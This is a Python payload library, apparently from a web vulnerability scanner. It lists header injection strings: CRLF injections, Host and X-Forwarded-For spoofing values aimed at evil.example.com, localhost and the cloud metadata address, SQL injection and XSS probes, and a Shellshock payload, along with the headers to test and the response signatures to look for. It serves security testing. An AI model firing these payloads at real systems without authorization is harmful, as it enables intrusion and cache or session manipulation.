"""
Header injection payload library.
Tests for CRLF injection, Host header attacks, and cache poisoning.
"""

from __future__ import annotations


# ── CRLF injection payloads ───────────────────────────────────────────────────

CRLF_PAYLOADS: list[str] = [
    "\r\nX-Injected: Header",
    "\r\n X-Injected: Header",
    "\r\n\tX-Injected: Header",
    "%0d%0aX-Injected: Header",
    "%0a%0dX-Injected: Header",
    "%0aX-Injected: Header",
    "%0dX-Injected: Header",
    "%23%0aX-Injected: Header",
    "%e5%98%8a%e5%98%8dX-Injected: Header",   # Unicode CRLF
    "%0d%0aContent-Type: text/html",
    "%0d%0aSet-Cookie: injected=1",
    "\r\nSet-Cookie: injected=1",
    "%0d%0aLocation: http://evil.example.com",
]

# ── Host header payloads ──────────────────────────────────────────────────────

HOST_PAYLOADS: list[str] = [
    "evil.example.com",
    "127.0.0.1",
    "localhost",
    "169.254.169.254",
    "evil.example.com:80",
    "evil.example.com:443",
    "target.com@evil.example.com",
    "evil.example.com #",
]

# ── X-Forwarded-For / IP spoofing payloads ────────────────────────────────────

XFF_PAYLOADS: list[str] = [
    "127.0.0.1",
    "::1",
    "127.0.0.1, 127.0.0.1",
    "127.0.0.1;127.0.0.1",
    "0.0.0.0",
    "169.254.169.254",   # Cloud metadata bypass
    "10.0.0.1",
    "192.168.1.1",
    "localhost",
    "127.0.0.1 ' OR 1=1--",   # SQLi in XFF
    "127.0.0.1<script>alert(1)</script>",  # XSS in XFF
]

# ── Referer payloads ──────────────────────────────────────────────────────────

REFERER_PAYLOADS: list[str] = [
    "http://evil.example.com",
    "javascript:alert(1)",
    "http://127.0.0.1/",
    "http://169.254.169.254/",
    "' OR 1=1--",
    "<script>alert(1)</script>",
]

# ── User-Agent payloads ───────────────────────────────────────────────────────

UA_PAYLOADS: list[str] = [
    "' OR '1'='1",
    "' OR 1=1--",
    "<script>alert(1)</script>",
    "() { :; }; echo Content-Type: text/html; echo; echo SHELLSHOCKED",   # ShellShock
    "Mozilla/5.0 ' OR 1=1--",
]

# ── Which headers to test ─────────────────────────────────────────────────────

INJECTABLE_HEADERS: list[tuple[str, list[str]]] = [
    ("X-Forwarded-For",        XFF_PAYLOADS[:5]    + CRLF_PAYLOADS[:3]),
    ("X-Forwarded-Host",       HOST_PAYLOADS[:5]   + CRLF_PAYLOADS[:3]),
    ("X-Real-IP",              XFF_PAYLOADS[:5]),
    ("Referer",                REFERER_PAYLOADS    + CRLF_PAYLOADS[:3]),
    ("User-Agent",             UA_PAYLOADS),
    ("X-Custom-IP-Authorization", XFF_PAYLOADS[:5]),
    ("X-Remote-IP",            XFF_PAYLOADS[:5]),
    ("X-Client-IP",            XFF_PAYLOADS[:5]),
    ("True-Client-IP",         XFF_PAYLOADS[:5]),
    ("CF-Connecting-IP",       XFF_PAYLOADS[:5]),
]

# ── Detection signatures ──────────────────────────────────────────────────────

CRLF_RESPONSE_HEADERS: list[str] = [
    "x-injected",
    "injected",
    "set-cookie: injected",
]
